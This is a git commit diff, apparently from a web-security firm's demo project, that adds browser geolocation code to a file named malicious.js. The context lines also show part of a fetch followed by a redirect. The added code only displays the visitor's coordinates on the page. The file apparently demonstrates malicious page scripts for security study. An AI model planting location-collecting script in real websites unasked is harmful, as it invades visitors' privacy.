79349d91141da0be17da33112d6890c67de96243
AzureAD\YakovMendelson <yakov.m@reflectiz.com>
2021-08-08 19:15:47 +0300

    add GPS

--- docs/js/malicious.js
+++ docs/js/malicious.js
@@ -9,4 +9,26 @@ function myFunction() {
     .then(res=>{console.log(res,a,b,c); 
         window.location.href = 'confirmation.html'
     })
+
 }
+
+
+    
+    var x = document.getElementById("demo");
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else { 
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
+    
+    function showPosition(position) {
+      x.innerHTML = "Latitude: " + position.coords.latitude + 
+      "<br>Longitude: " + position.coords.longitude;
+    }
+
+
+
+
